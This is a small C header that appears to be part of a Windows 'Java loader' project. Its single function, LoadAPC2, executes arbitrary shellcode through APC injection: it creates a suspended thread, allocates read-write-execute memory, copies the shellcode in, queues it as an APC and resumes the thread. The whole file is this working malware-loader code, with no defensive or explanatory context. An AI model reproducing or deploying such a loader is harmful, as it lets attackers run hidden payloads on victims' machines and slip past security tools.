#ifndef JAVA_LOADER_APC_2_H
#define JAVA_LOADER_APC_2_H

#endif //JAVA_LOADER_APC_2_H

#include <Windows.h>

typedef VOID (NTAPI *pNtTestAlert)(VOID);

int LoadAPC2(unsigned char *shellcode, int length) {
    HANDLE hThread = CreateThread(0, 0,
                                  (LPTHREAD_START_ROUTINE) 0xfff,
                                  0, CREATE_SUSPENDED, NULL);
    LPVOID lpBaseAddress = VirtualAlloc(NULL, length,
                                        MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    memcpy(lpBaseAddress, shellcode, length);
    QueueUserAPC((PAPCFUNC) lpBaseAddress, hThread, (ULONG_PTR) NULL);
    ResumeThread(hThread);
    WaitForSingleObject(hThread, INFINITE);
    return TRUE;
}